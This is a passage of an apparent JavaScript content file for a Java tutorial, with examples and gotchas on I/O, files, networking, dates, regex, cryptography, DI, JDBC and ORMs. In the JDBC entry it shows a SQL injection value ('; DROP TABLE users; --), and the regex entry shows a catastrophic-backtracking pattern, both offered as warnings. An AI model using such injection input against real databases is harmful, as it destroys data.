    "(<code>InputStream</code>/<code>OutputStream</code>) for binary data and character streams " +
    "(<code>Reader</code>/<code>Writer</code>) for text. Buffered wrappers improve performance. Modern Java " +
    "also offers <code>java.nio</code> and convenient helpers like <code>Files.readString</code>. Always " +
    "close streams (use try-with-resources).</p>",
  examples: [
    {
      title: "Example 1: Reading text safely",
      description: "<p>Buffered reading with auto-close.</p>",
      code: "try (var reader = new BufferedReader(new FileReader(\"data.txt\"))) {\n  String line;\n  while ((line = reader.readLine()) != null) {\n    System.out.println(line);\n  }\n}  // reader closed automatically"
    },
    {
      title: "Example 2: Modern convenience methods",
      description: "<p>NIO helpers for common cases.</p>",
      code: "import java.nio.file.*;\nString content = Files.readString(Path.of(\"data.txt\"));\nList<String> lines = Files.readAllLines(Path.of(\"data.txt\"));\nFiles.writeString(Path.of(\"out.txt\"), \"hello\");"
    },
    {
      title: "Example 3: byte streams vs character readers",
      description: "<p>Use <code>InputStream</code>/<code>OutputStream</code> for binary data, <code>Reader</code>/<code>Writer</code> for text - and always specify the charset.</p>",
      code: "// binary copy\n" +
        "try (var in = Files.newInputStream(src); var out = Files.newOutputStream(dst)) {\n" +
        "  in.transferTo(out);\n" +
        "}\n" +
        "// text, explicit charset (don't rely on the platform default!)\n" +
        "try (var r = Files.newBufferedReader(path, StandardCharsets.UTF_8)) {\n" +
        "  r.lines().forEach(System.out::println);\n" +
        "}"
    },
    {
      title: "Example 4 (edge case): unbuffered I/O and default-charset bugs",
      description: "<p>Reading a byte at a time is brutally slow; and relying on the platform default charset makes files unportable across machines.</p>",
      code: "// SLOW: a syscall per byte\n" +
        "int b; while ((b = rawStream.read()) != -1) { /* ... */ }\n" +
        "// FAST: wrap in BufferedInputStream, or use transferTo / readAllBytes\n" +
        "\n" +
        "new String(bytes);                       // uses PLATFORM default - varies by OS\n" +
        "new String(bytes, StandardCharsets.UTF_8); // explicit and portable"
    }
  ],
  whenToUse: "<p>Use I/O for files, network, and data exchange. Prefer <strong>buffered</strong> streams (raw " +
    "unbuffered reads/writes are slow) and the modern <code>java.nio.file.Files</code> helpers for simple " +
    "cases. <strong>Gotchas:</strong> always close resources (try-with-resources) to avoid leaks. Specify " +
    "character encoding explicitly (UTF-8) to avoid platform-dependent bugs. <code>readAllLines</code>/" +
    "<code>readString</code> load everything into memory &mdash; stream large files line-by-line instead. " +
    "Byte vs character streams matters (don't read binary as text). Handle <code>IOException</code> " +
    "properly.</p>"
};

C["file-operations"] = {
  summary: "<p><strong>File operations</strong> create, read, write, copy, move, and delete files and " +
    "directories. Modern Java uses <code>java.nio.file</code> &mdash; <code>Path</code>, <code>Files</code>, " +
    "<code>Paths</code> &mdash; which is more powerful and convenient than the legacy <code>java.io.File</code>. " +
    "<code>Files</code> offers one-line methods for most common operations plus directory walking and " +
    "attributes.</p>",
  examples: [
    {
      title: "Example 1: Common file operations",
      description: "<p>Existence, read/write, copy, delete.</p>",
      code: "Path p = Path.of(\"data.txt\");\nFiles.exists(p);\nFiles.writeString(p, \"hello\");\nString s = Files.readString(p);\nFiles.copy(p, Path.of(\"copy.txt\"), StandardCopyOption.REPLACE_EXISTING);\nFiles.deleteIfExists(p);"
    },
    {
      title: "Example 2: Directories and walking",
      description: "<p>Create dirs and traverse trees.</p>",
      code: "Files.createDirectories(Path.of(\"a/b/c\"));\ntry (var stream = Files.walk(Path.of(\"src\"))) {\n  stream.filter(Files::isRegularFile)\n        .filter(f -> f.toString().endsWith(\".java\"))\n        .forEach(System.out::println);\n}"
    },
    {
      title: "Example 3: small-file convenience and directory walking",
      description: "<p><code>Files</code> has one-liners for small files and a stream for traversing trees.</p>",
      code: "String text = Files.readString(path);            // whole small file\n" +
        "Files.writeString(out, text);                    // write it back\n" +
        "List<String> lines = Files.readAllLines(path);\n" +
        "\n" +
        "try (var walk = Files.walk(dir)) {               // recursive traversal\n" +
        "  walk.filter(p -> p.toString().endsWith(\".java\")).forEach(System.out::println);\n" +
        "}"
    },
    {
      title: "Example 4 (edge case): readString loads everything, and you must close walk()",
      description: "<p><code>readAllLines</code>/<code>readString</code> OOM on huge files; <code>Files.lines</code>/<code>walk</code> return streams that hold OS handles and must be closed.</p>",
      code: "// DON'T on a multi-GB file:\n" +
        "List<String> all = Files.readAllLines(huge); // OutOfMemoryError\n" +
        "\n" +
        "// DO - lazy + closed:\n" +
        "try (var lines = Files.lines(huge)) {\n" +
        "  long n = lines.filter(s -> s.contains(\"ERROR\")).count();\n" +
        "} // closing the stream releases the file handle"
    }
  ],
  whenToUse: "<p>Use <code>java.nio.file</code> (<code>Path</code>/<code>Files</code>) for all file work in " +
    "modern Java &mdash; it's clearer and more capable than the old <code>File</code> API. <strong>Gotchas:</strong> " +
    "many operations throw <code>IOException</code> (handle it). Watch for path-separator and encoding " +
    "portability (use <code>Path.of</code>, specify UTF-8). <code>Files.walk</code> returns a stream that must " +
    "be closed (try-with-resources). Beware race conditions (a file checked with <code>exists()</code> may be " +
    "gone before you use it &mdash; handle exceptions instead). For huge files, stream rather than loading " +
    "fully. Validate/sanitize file paths from untrusted input (path traversal).</p>"
};

C["networking"] = {
  summary: "<p>Java <strong>networking</strong> enables communication over networks: low-level " +
    "<code>Socket</code>/<code>ServerSocket</code> (TCP) and <code>DatagramSocket</code> (UDP), and high-" +
    "level HTTP via the modern <code>java.net.http.HttpClient</code> (Java 11+). Most applications use the " +
    "HTTP client or higher-level frameworks rather than raw sockets.</p>",
  examples: [
    {
      title: "Example 1: HTTP request with HttpClient",
      description: "<p>The modern way to call HTTP APIs.</p>",
      code: "HttpClient client = HttpClient.newHttpClient();\nHttpRequest req = HttpRequest.newBuilder()\n  .uri(URI.create(\"https://api.example.com/data\"))\n  .header(\"Authorization\", \"Bearer token\")\n  .build();\nHttpResponse<String> res = client.send(req, BodyHandlers.ofString());\nres.statusCode(); res.body();"
    },
    {
      title: "Example 2: Low-level TCP socket",
      description: "<p>Raw socket (rarely needed directly).</p>",
      code: "try (Socket socket = new Socket(\"example.com\", 80);\n     var out = new PrintWriter(socket.getOutputStream())) {\n  out.println(\"GET / HTTP/1.1\");\n}  // most apps use HttpClient/frameworks instead"
    },
    {
      title: "Example 3: async requests with HttpClient",
      description: "<p><code>sendAsync</code> returns a <code>CompletableFuture</code>, freeing the calling thread while the request is in flight.</p>",
      code: "var client = HttpClient.newHttpClient();\n" +
        "var req = HttpRequest.newBuilder(URI.create(\"https://api.example.com\")).build();\n" +
        "\n" +
        "client.sendAsync(req, HttpResponse.BodyHandlers.ofString())\n" +
        "      .thenApply(HttpResponse::body)\n" +
        "      .thenAccept(System.out::println);\n" +
        "// non-blocking; combine many with CompletableFuture.allOf(...)"
    },
    {
      title: "Example 4 (edge case): always set timeouts",
      description: "<p>Without explicit timeouts a slow or hung server can block a thread (or exhaust the pool) indefinitely.</p>",
      code: "var client = HttpClient.newBuilder()\n" +
        "    .connectTimeout(Duration.ofSeconds(5)).build();   // connect phase\n" +
        "var req = HttpRequest.newBuilder(uri)\n" +
        "    .timeout(Duration.ofSeconds(10))                  // whole request\n" +
        "    .build();\n" +
        "// Omitting these is a leading cause of production thread-pool exhaustion."
    }
  ],
  whenToUse: "<p>Use <code>HttpClient</code> for calling HTTP services (supports sync, async, HTTP/2). Use raw " +
    "sockets only for custom protocols or low-level needs. For servers/APIs, use a framework (Spring, etc.) " +
    "rather than hand-coding sockets. <strong>Gotchas:</strong> always set <strong>timeouts</strong> (a " +
    "hanging network call can block indefinitely). Handle <code>IOException</code> and retries/backoff for " +
    "transient failures. Close sockets/connections (try-with-resources). Reuse <code>HttpClient</code> " +
    "instances (they're meant to be shared, not created per request). Validate/sanitize URLs from untrusted " +
    "input (SSRF). Prefer async (<code>sendAsync</code>) for high concurrency.</p>"
};

C["date-and-time"] = {
  summary: "<p>The modern <strong><code>java.time</code></strong> API (Java 8+) handles dates/times cleanly " +
    "and immutably: <code>LocalDate</code>, <code>LocalTime</code>, <code>LocalDateTime</code> (no zone), " +
    "<code>ZonedDateTime</code>/<code>Instant</code> (with zone/UTC), <code>Duration</code>/<code>Period</code> " +
    "(amounts), and <code>DateTimeFormatter</code>. It replaces the error-prone legacy <code>Date</code>/" +
    "<code>Calendar</code> classes.</p>",
  examples: [
    {
      title: "Example 1: Core java.time types",
      description: "<p>Immutable, readable date/time handling.</p>",
      code: "LocalDate today = LocalDate.now();\nLocalDate due = today.plusDays(30);\nLocalDateTime dt = LocalDateTime.of(2026, 6, 14, 9, 30);\nInstant now = Instant.now();                 // UTC timestamp\nZonedDateTime z = ZonedDateTime.now(ZoneId.of(\"Europe/Sofia\"));"
    },
    {
      title: "Example 2: Durations, comparison, formatting",
      description: "<p>Amounts of time and parsing/formatting.</p>",
      code: "Duration d = Duration.between(start, end);\nboolean overdue = due.isBefore(LocalDate.now());\nString s = dt.format(DateTimeFormatter.ISO_LOCAL_DATE_TIME);\nLocalDate parsed = LocalDate.parse(\"2026-06-14\");"
    },
    {
      title: "Example 3: instants, zones, and formatting",
      description: "<p>Use <code>Instant</code> for machine time (UTC), <code>ZonedDateTime</code> for human time in a zone, and <code>DateTimeFormatter</code> for I/O.</p>",
      code: "Instant now = Instant.now();                       // UTC timestamp\n" +
        "ZonedDateTime ams = now.atZone(ZoneId.of(\"Europe/Amsterdam\"));\n" +
        "String s = ams.format(DateTimeFormatter.ISO_OFFSET_DATE_TIME);\n" +
        "\n" +
        "LocalDate due = LocalDate.now().plusDays(30);      // date math is immutable\n" +
        "long days = ChronoUnit.DAYS.between(LocalDate.now(), due); // 30"
    },
    {
      title: "Example 4 (edge case): java.time objects are immutable; legacy Date is not",
      description: "<p>Mutating methods return a new object - ignoring the result is a classic bug. Also avoid the old <code>Date</code>/<code>Calendar</code>.</p>",
      code: "LocalDate d = LocalDate.of(2026, 1, 1);\n" +
        "d.plusDays(1);              // BUG: result discarded, d unchanged\n" +
        "d = d.plusDays(1);          // correct - reassign\n" +
        "\n" +
        "// Legacy traps: java.util.Date is mutable, months are 0-based in Calendar,\n" +
        "// and SimpleDateFormat is NOT thread-safe. Prefer java.time everywhere."
    }
  ],
  whenToUse: "<p>Always use <code>java.time</code> for new code. <strong>Gotchas:</strong> avoid the legacy " +
    "<code>java.util.Date</code>/<code>Calendar</code> (mutable, confusing, error-prone). " +
    "<code>java.time</code> objects are <strong>immutable</strong> &mdash; methods return new instances " +
    "(<code>date.plusDays(1)</code> doesn't change <code>date</code>). Be deliberate about time zones: store/" +
    "compute in UTC (<code>Instant</code>), convert to local zones only for display. Don't use " +
    "<code>LocalDateTime</code> for timestamps that need a zone. Watch DST transitions. Specify formats " +
    "explicitly to avoid locale surprises.</p>"
};

C["regular-expressions"] = {
  summary: "<p><strong>Regular expressions (regex)</strong> describe text patterns for matching, searching, " +
    "and replacing. Java provides them via <code>java.util.regex</code> (<code>Pattern</code> and " +
    "<code>Matcher</code>) and convenient <code>String</code> methods (<code>matches</code>, " +
    "<code>replaceAll</code>, <code>split</code>). They're powerful for validation, parsing, and text " +
    "transformation.</p>",
  examples: [
    {
      title: "Example 1: Matching and extracting",
      description: "<p>Compile a pattern; find/capture groups.</p>",
      code: "Pattern p = Pattern.compile(\"(\\\\d{4})-(\\\\d{2})-(\\\\d{2})\");\nMatcher m = p.matcher(\"Date: 2026-06-14\");\nif (m.find()) {\n  m.group(1);   // \"2026\" (capture group)\n  m.group(2);   // \"06\"\n}"
    },
    {
      title: "Example 2: String convenience methods",
      description: "<p>Validate, replace, split.</p>",
      code: "\"a1b2\".replaceAll(\"\\\\d\", \"#\");   // \"a#b#\"\n\"a,b,c\".split(\",\");               // [a, b, c]\n\"2026\".matches(\"\\\\d{4}\");           // true (whole-string match)"
    },
    {
      title: "Example 3: compile once, capture groups",
      description: "<p>Pre-compile a <code>Pattern</code> for reuse and pull out captured groups with a <code>Matcher</code>.</p>",
      code: "Pattern P = Pattern.compile(\"(\\\\d{4})-(\\\\d{2})-(\\\\d{2})\"); // reuse this\n" +
        "Matcher m = P.matcher(\"2026-06-15\");\n" +
        "if (m.matches()) {\n" +
        "  System.out.println(m.group(1)); // 2026 (year)\n" +
        "  System.out.println(m.group(3)); // 15   (day)\n" +
        "}"
    },
    {
      title: "Example 4 (edge case): catastrophic backtracking (ReDoS)",
      description: "<p>Nested/ambiguous quantifiers can blow up to exponential time on certain inputs - a denial-of-service risk on untrusted input.</p>",
      code: "// DANGEROUS: (a+)+ on a long non-matching string hangs the thread\n" +
        "Pattern.compile(\"(a+)+$\").matcher(\"aaaaaaaaaaaaaaaaaaaa!\").matches();\n" +
        "\n" +
        "// Mitigations: avoid nested quantifiers, anchor the pattern, use possessive\n" +
        "// quantifiers (a++), or validate length/use a real parser for complex formats.\n" +
        "// Also recompiling the same Pattern in a loop is a needless perf hit."
    }
  ],
  whenToUse: "<p>Use regex for pattern matching/validation (emails, phone formats), extracting structured " +
    "text, and find-replace. <strong>Gotchas:</strong> <strong>compile patterns once</strong> and reuse the " +
    "<code>Pattern</code> (compiling is expensive) rather than calling <code>String.matches</code> in a loop. " +
    "Java strings require double-escaping (<code>\\\\d</code>). Beware <strong>catastrophic backtracking</strong> " +
    "(ReDoS) &mdash; pathological patterns on attacker input can hang the CPU; keep patterns simple and bound " +
    "input. Don't parse complex structured formats (HTML, JSON) with regex &mdash; use proper parsers. " +
    "<code>matches()</code> requires the <em>whole</em> string to match; use <code>find()</code> for partial.</p>"
};

C["cryptography"] = {
  summary: "<p>Java provides cryptography through the <strong>JCA (Java Cryptography Architecture)</strong>: " +
    "hashing (<code>MessageDigest</code> &mdash; SHA-256), symmetric encryption (<code>Cipher</code> &mdash; " +
    "AES), asymmetric crypto (RSA/EC), digital signatures, secure random (<code>SecureRandom</code>), and " +
    "password hashing. The golden rule: <strong>use these standard primitives correctly &mdash; never invent " +
    "your own crypto.</strong></p>",
  examples: [
    {
      title: "Example 1: Hashing and secure random",
      description: "<p>SHA-256 digest and cryptographically secure randomness.</p>",
      code: "MessageDigest md = MessageDigest.getInstance(\"SHA-256\");\nbyte[] hash = md.digest(\"data\".getBytes(StandardCharsets.UTF_8));\n\n// For security, NEVER Math.random():\nSecureRandom rnd = new SecureRandom();\nbyte[] token = new byte[32];\nrnd.nextBytes(token);"
    },
    {
      title: "Example 2: Password hashing (not plain SHA!)",
      description: "<p>Use a slow, salted password hash.</p>",
      code: "// Passwords: NOT SHA-256 (too fast for brute force).\n// Use bcrypt/argon2/PBKDF2 (slow, salted) - via a vetted library:\n//   String hash = BCrypt.hashpw(password, BCrypt.gensalt());\n//   boolean ok = BCrypt.checkpw(input, hash);"
    },
    {
      title: "Example 3: hash a password with a slow, salted algorithm",
      description: "<p>Passwords need a deliberately slow, salted hash (bcrypt/argon2/PBKDF2) - never a fast general-purpose digest.</p>",
      code: "// PBKDF2 via the JDK (bcrypt/argon2 via a library like Spring Security is common):\n" +
        "var spec = new PBEKeySpec(password, salt, 210_000, 256); // high iteration count\n" +
        "byte[] hash = SecretKeyFactory.getInstance(\"PBKDF2WithHmacSHA256\")\n" +
        "    .generateSecret(spec).getEncoded();\n" +
        "// Store salt + iterations + hash. Verify by re-deriving and constant-time compare."
    },
    {
      title: "Example 4 (edge case): don't roll your own / common crypto mistakes",
      description: "<p>The dangerous defaults: SHA-256 for passwords, ECB mode, hardcoded keys/IVs, and timing-unsafe comparisons.</p>",
      code: "// WRONG for passwords - far too fast, brute-forceable:\n" +
        "MessageDigest.getInstance(\"SHA-256\").digest(pw.getBytes());\n" +
        "\n" +
        "// WRONG cipher mode - ECB leaks patterns; use AES/GCM with a random IV:\n" +
        "Cipher.getInstance(\"AES/ECB/PKCS5Padding\");      // avoid\n" +
        "Cipher.getInstance(\"AES/GCM/NoPadding\");         // authenticated, use a fresh IV\n" +
        "// Use SecureRandom (not Random) for keys/IVs, and MessageDigest.isEqual for compares."
    }
  ],
  whenToUse: "<p>Use crypto for passwords (slow hash), data encryption, tokens, signatures, and secure " +
    "randomness. <strong>Critical gotchas:</strong> <strong>never roll your own crypto</strong> or invent " +
    "schemes. Use <code>SecureRandom</code>, not <code>Math.random()</code>, for anything security-related. " +
    "Hash passwords with bcrypt/argon2/PBKDF2 (salted, slow) &mdash; <em>not</em> plain SHA/MD5. Use modern " +
    "algorithms (AES-GCM, not ECB; SHA-256+, not MD5/SHA-1) and proper key management (a KMS, never hardcoded " +
    "keys). Crypto is extremely easy to misuse &mdash; prefer high-level, vetted libraries and keep them " +
    "updated.</p>"
};

/* ===================== DEPENDENCY INJECTION ===================== */

C["dependency-injection"] = {
  summary: "<p><strong>Dependency Injection (DI)</strong> is a design pattern where an object's dependencies " +
    "are provided from the outside rather than created internally. Instead of <code>new</code>-ing " +
    "collaborators, a class declares what it needs (usually via constructor parameters) and a framework (or " +
    "your code) supplies them. DI yields loosely-coupled, testable code and is the foundation of frameworks " +
    "like Spring.</p>",
  examples: [
    {
      title: "Example 1: Constructor injection",
      description: "<p>Dependencies passed in, not created inside.</p>",
      code: "class OrderService {\n  private final PaymentGateway gateway;\n  // dependency injected via constructor\n  OrderService(PaymentGateway gateway) { this.gateway = gateway; }\n}\n// Wiring (manual or by a framework):\nvar service = new OrderService(new StripeGateway());"
    },
    {
      title: "Example 2: DI enables easy testing",
      description: "<p>Inject a fake/mock in tests.</p>",
      code: "// In tests, inject a controlled fake instead of the real gateway:\nPaymentGateway fake = amount -> { /* record call */ };\nvar service = new OrderService(fake);\n// No real Stripe call - fast, deterministic test."
    },
    {
      title: "Example 3: constructor injection beats field injection",
      description: "<p>Constructor injection makes dependencies explicit, allows <code>final</code> fields, and needs no framework to test.</p>",
      code: "class OrderService {\n" +
        "  private final PaymentGateway gateway;        // final = guaranteed set\n" +
        "  OrderService(PaymentGateway gateway) { this.gateway = gateway; }\n" +
        "}\n" +
        "// In a test, just: new OrderService(new FakeGateway()); no Spring needed.\n" +
        "// Field injection (@Autowired on a field) can't be final and hides the dependency."
    },
    {
      title: "Example 4 (edge case): DI doesn't remove the need to manage scope/lifecycle",
      description: "<p>Injecting a request-scoped or stateful bean into a singleton can leak state or capture a stale instance.</p>",
      code: "// Singleton holding a per-request bean directly = bug:\n" +
        "@Component class Cache {\n" +
        "  @Autowired RequestContext ctx; // captured ONCE; same instance for all requests!\n" +
        "}\n" +
        "// Fix: inject a Provider<RequestContext> / ObjectFactory and resolve per use,\n" +
        "// or rethink the scope. DI wires objects; it doesn't fix scope mismatches."
    }
  ],
  whenToUse: "<p>Use DI throughout application code with collaborators &mdash; it's central to testable, " +
    "maintainable design and to frameworks (Spring, Guice, CDI). Prefer <strong>constructor injection</strong> " +
    "(makes dependencies explicit/required, allows <code>final</code> fields, works without a framework in " +
    "tests). <strong>Gotchas:</strong> avoid field injection (hides dependencies, needs reflection to test). " +
    "Too many constructor parameters signals a class doing too much &mdash; split it. Circular dependencies " +
    "indicate a design problem. You don't always need a DI framework &mdash; manual injection works for small " +
    "apps; frameworks shine as wiring grows.</p>"
};

/* ===================== DATABASE ACCESS ===================== */

C["jdbc"] = {
  summary: "<p><strong>JDBC (Java Database Connectivity)</strong> is the low-level standard API for connecting " +
    "to relational databases and executing SQL. You get a <code>Connection</code>, create " +
    "<code>PreparedStatement</code>s, execute queries, and process <code>ResultSet</code>s. It's the " +
    "foundation that higher-level tools (Hibernate, Spring Data, JdbcTemplate) build on. Use " +
    "<strong>PreparedStatement</strong> to prevent SQL injection and a connection pool for performance.</p>",
  examples: [
    {
      title: "Example 1: Safe parameterized query",
      description: "<p>PreparedStatement prevents SQL injection.</p>",
      code: "String sql = \"SELECT name FROM users WHERE id = ?\";\ntry (Connection c = dataSource.getConnection();\n     PreparedStatement ps = c.prepareStatement(sql)) {\n  ps.setInt(1, userId);            // bound parameter (safe)\n  try (ResultSet rs = ps.executeQuery()) {\n    if (rs.next()) return rs.getString(\"name\");\n  }\n}"
    },
    {
      title: "Example 2: Never concatenate user input",
      description: "<p>The classic SQL injection mistake.</p>",
      code: "// VULNERABLE - SQL injection:\n// \"SELECT * FROM users WHERE name = '\" + input + \"'\"\n// input = \"'; DROP TABLE users; --\"  -> disaster\n// ALWAYS use ? placeholders + setXxx (PreparedStatement)."
    },
    {
      title: "Example 3: PreparedStatement prevents SQL injection",
      description: "<p>Always bind parameters with <code>?</code> placeholders - never concatenate user input into SQL.</p>",
      code: "// VULNERABLE:\n" +
        "stmt.executeQuery(\"SELECT * FROM users WHERE name = '\" + name + \"'\");\n" +
        "\n" +
        "// SAFE - parameter is bound, not interpolated:\n" +
        "try (var ps = conn.prepareStatement(\"SELECT * FROM users WHERE name = ?\")) {\n" +
        "  ps.setString(1, name);\n" +
        "  try (var rs = ps.executeQuery()) { while (rs.next()) { /* ... */ } }\n" +
        "}"
    },
    {
      title: "Example 4 (edge case): leaked connections and unmanaged transactions",
      description: "<p>Forgetting to close Connection/Statement/ResultSet exhausts the pool; and auto-commit means each statement is its own transaction.</p>",
      code: "conn.setAutoCommit(false);          // group statements into one transaction\n" +
        "try {\n" +
        "  // ... multiple updates ...\n" +
        "  conn.commit();\n" +
        "} catch (SQLException e) {\n" +
        "  conn.rollback();                  // all-or-nothing\n" +
        "  throw e;\n" +
        "}\n" +
        "// Use try-with-resources for conn/ps/rs - a leaked Connection eventually\n" +
        "// hangs the app when the pool is empty."
    }
  ],
  whenToUse: "<p>Use raw JDBC when you want fine control, minimal dependencies, or maximum performance for " +
    "specific queries. Most apps use a higher-level abstraction (Spring's <code>JdbcTemplate</code>, JPA/" +
    "Hibernate) built on JDBC. <strong>Gotchas:</strong> <strong>always use <code>PreparedStatement</code></strong> " +
    "with bound parameters &mdash; string-concatenating user input is SQL injection (a top vulnerability). " +
    "Close <code>Connection</code>/<code>Statement</code>/<code>ResultSet</code> (try-with-resources). Use a " +
    "<strong>connection pool</strong> (HikariCP) &mdash; opening connections per query is slow. Manage " +
    "transactions explicitly. Raw JDBC is verbose; that's why ORMs exist.</p>"
};

C["hibernate"] = {
  summary: "<p><strong>Hibernate</strong> is the most popular Java <strong>ORM (Object-Relational Mapper)</strong> " +
    "and the reference JPA implementation. It maps Java objects (entities) to database tables, so you work " +
    "with objects and let Hibernate generate SQL for CRUD. It manages a persistence context (first-level " +
    "cache, dirty checking), lazy loading, relationships, and transactions &mdash; eliminating most " +
    "boilerplate JDBC.</p>",
  examples: [
    {
      title: "Example 1: An entity mapping",
      description: "<p>Annotations map a class to a table.</p>",
      code: "@Entity\n@Table(name = \"users\")\nclass User {\n  @Id @GeneratedValue Long id;\n  @Column(nullable = false) String name;\n  @OneToMany(mappedBy = \"user\") List<Order> orders;\n}"
    },
    {
      title: "Example 2: Dirty checking (auto-update)",
      description: "<p>Changes to managed entities sync automatically.</p>",
      code: "@Transactional\nvoid rename(Long id, String newName) {\n  User u = em.find(User.class, id);  // now 'managed'\n  u.setName(newName);                // no explicit save needed!\n}  // Hibernate issues UPDATE at commit (dirty checking)"
    },
    {
      title: "Example 3: entity mapping and a lazy association",
      description: "<p>Annotations map a class to a table; relationships default to lazy/eager depending on cardinality.</p>",
      code: "@Entity\n" +
        "class Order {\n" +
        "  @Id @GeneratedValue Long id;\n" +
        "  @ManyToOne(fetch = FetchType.LAZY) Customer customer; // loaded on access\n" +
        "  @OneToMany(mappedBy = \"order\") List<Item> items;\n" +
        "}"
    },
    {
      title: "Example 4 (edge case): the N+1 select problem and LazyInitializationException",
      description: "<p>The two most common Hibernate pains - per-row queries for associations, and touching a lazy field after the session closes.</p>",
      code: "// N+1: 1 query for orders + 1 per order for its customer\n" +
        "orders.forEach(o -> System.out.println(o.customer.name)); // 1 + N queries\n" +
        "// Fix: fetch join -> \"SELECT o FROM Order o JOIN FETCH o.customer\"\n" +
        "\n" +
        "// LazyInitializationException: accessing 'items' after the tx/session ended.\n" +
        "// Fix: fetch within the transaction, or use a DTO projection."
    }
  ],
  whenToUse: "<p>Use Hibernate/JPA for the bulk of CRUD persistence &mdash; it removes tedious JDBC and maps " +
    "objects naturally. <strong>Gotchas:</strong> the ORM hides SQL, causing classic traps: the " +
    "<strong>N+1 query problem</strong> (lazy associations firing a query per row &mdash; use " +
    "<code>JOIN FETCH</code>/entity graphs), <code>LazyInitializationException</code> (accessing a lazy " +
    "relation outside a transaction/session), and inefficient generated SQL. Monitor the queries Hibernate " +
    "emits (<code>show_sql</code>). For complex reporting or bulk operations, use native SQL/JPQL. Understand " +
    "the entity lifecycle (transient/managed/detached). It's powerful but not 'set and forget'.</p>"
};

C["spring-data-jpa"] = {
  summary: "<p><strong>Spring Data JPA</strong> sits on top of JPA/Hibernate and slashes data-access " +
    "boilerplate: you define <strong>repository interfaces</strong> and Spring generates the implementation. " +
    "Extend <code>JpaRepository</code> for instant CRUD, declare derived query methods by name " +
    "(<code>findByEmail</code>), or write <code>@Query</code> for custom JPQL/SQL &mdash; plus pagination, " +
    "sorting, and auditing for free.</p>",
  examples: [
    {
      title: "Example 1: A repository with zero implementation",
      description: "<p>CRUD + derived queries from an interface.</p>",
      code: "interface UserRepository extends JpaRepository<User, Long> {\n  // save, findById, findAll, delete... inherited automatically\n  Optional<User> findByEmail(String email);   // derived query\n  List<User> findByActiveTrueOrderByNameAsc();\n}"
    },
    {
      title: "Example 2: Custom query + pagination",
      description: "<p>Explicit JPQL and paged results.</p>",
      code: "interface OrderRepository extends JpaRepository<Order, Long> {\n  @Query(\"SELECT o FROM Order o WHERE o.total > :min\")\n  List<Order> findBigOrders(@Param(\"min\") BigDecimal min);\n  Page<Order> findByCustomerId(Long id, Pageable page);\n}"
    },
    {
      title: "Example 3: derived queries, @Query, and Pageable",
      description: "<p>Method names generate queries; <code>@Query</code> handles custom JPQL; <code>Pageable</code> adds paging/sorting for free.</p>",
      code: "interface UserRepo extends JpaRepository<User, Long> {\n" +
        "  List<User> findByLastNameAndActiveTrue(String last); // parsed from name\n" +
        "  Optional<User> findByEmail(String email);\n" +
        "\n" +
        "  @Query(\"select u from User u where u.age > :min\")\n" +
        "  Page<User> olderThan(int min, Pageable page);          // paginated\n" +
        "}"
    },
    {
      title: "Example 4 (edge case): typo'd property names fail at startup, and save() updates",
      description: "<p>A misspelled field in a derived query throws on context startup (good - fail fast); and <code>save</code> on an entity with an existing id is an update, not an insert.</p>",
      code: "List<User> findByemial(String e); // startup error: no property 'emial' on User\n" +
        "\n" +
        "var u = repo.findById(1L).get();\n" +
        "u.setName(\"new\");\n" +
        "repo.save(u); // UPDATE (id present) - within a tx, a dirty entity flushes anyway\n" +
        "// Derived queries also can't express everything - reach for @Query or Specifications."
    }
  ],
  whenToUse: "<p>Use Spring Data JPA for standard data access in Spring apps &mdash; it removes huge amounts of " +
    "repetitive code. Use derived methods for simple queries, <code>@Query</code> for complex ones, " +
    "Specifications for dynamic queries. <strong>Gotchas:</strong> derived method names get unwieldy fast " +
    "(<code>findByXAndYOrderByZ</code>) &mdash; switch to <code>@Query</code> for readability. It's still " +
    "Hibernate underneath, so all ORM caveats apply (N+1, lazy loading, transactions). A typo in a derived " +
    "method name may fail only at startup. For heavy reporting/bulk work, drop to native SQL. Test your " +
    "repository methods against a real DB (Testcontainers) for fidelity.</p>"
};

C["ebean"] = {
  summary: "<p><strong>Ebean</strong> is an alternative Java ORM (and persistence API) to JPA/Hibernate, " +
    "designed to be simpler and more intuitive, with a fluent query API and less configuration. It supports " +
    "both an Active Record style (<code>user.save()</code>) and a server/query style, automatic " +
    "relationship handling, and (notably) clearer control over lazy loading and generated SQL than Hibernate " +
    "in many cases.</p>",
  examples: [
    {
      title: "Example 1: Fluent query API",
      description: "<p>Type-safe queries without JPQL strings.</p>",
      code: "// Ebean's fluent query (conceptual):\nList<User> users = new QueryBean<User>()\n  .where().eq(\"active\", true)\n  .order().asc(\"name\")\n  .findList();"
    },
    {
      title: "Example 2: Active Record style",
      description: "<p>Entities can save themselves.</p>",
      code: "User u = new User();\nu.setName(\"Sam\");\nu.save();         // Active Record convenience\nUser found = DB.find(User.class, id);"
    },
    {
      title: "Example 3: Ebean's active-record style queries",
      description: "<p>Ebean offers a fluent query API directly on entities, with explicit fetch paths to control loading.</p>",
      code: "List<Customer> list = DB.find(Customer.class)\n" +
        "    .where().eq(\"status\", Status.ACTIVE)\n" +
        "    .fetch(\"orders\")              // explicit: avoids surprise N+1\n" +
        "    .orderBy(\"name\")\n" +
        "    .findList();"
    },
    {
      title: "Example 4 (edge case): smaller ecosystem and build-time enhancement",
      description: "<p>Ebean enhances entity bytecode at build time, so a misconfigured enhancer plugin causes lazy loading and dirty checking to silently fail.</p>",
      code: "// Requires the Ebean enhancer (Maven/Gradle plugin or agent).\n" +
        "// Symptom of a missing enhancer: lazy associations come back null and\n" +
        "// updates aren't detected. Verify the plugin is wired before debugging logic.\n" +
        "// Trade-off vs Hibernate/JPA: far fewer integrations, tutorials, and hires."
    }
  ],
  whenToUse: "<p>Consider Ebean when you want an ORM that's simpler and more predictable than Hibernate, with a " +
    "nice fluent query API and clearer SQL control &mdash; appealing for teams burned by Hibernate's " +
    "complexity. <strong>Gotchas:</strong> it has a much <strong>smaller ecosystem and community</strong> than " +
    "JPA/Hibernate, which dominate the Java world &mdash; fewer resources, integrations, and hires familiar " +
    "with it. The Active Record style couples entities to persistence (harder to test/decouple). For most " +
    "projects, JPA/Hibernate (especially via Spring Data) is the safer default due to ecosystem support; " +
    "choose Ebean deliberately when its simplicity genuinely wins for your team.</p>"
};

/* ===================== WEB FRAMEWORKS ===================== */

C["spring-spring-boot"] = {
  summary: "<p><strong>Spring</strong> is the dominant Java application framework, and <strong>Spring Boot</strong> " +
    "makes it fast to build production-ready, stand-alone apps via auto-configuration, starter dependencies, " +
    "and an embedded server. It provides dependency injection, web/REST (Spring MVC), data access (Spring " +
    "Data), security, and a vast ecosystem &mdash; the de-facto standard for Java backends.</p>",
  examples: [
    {
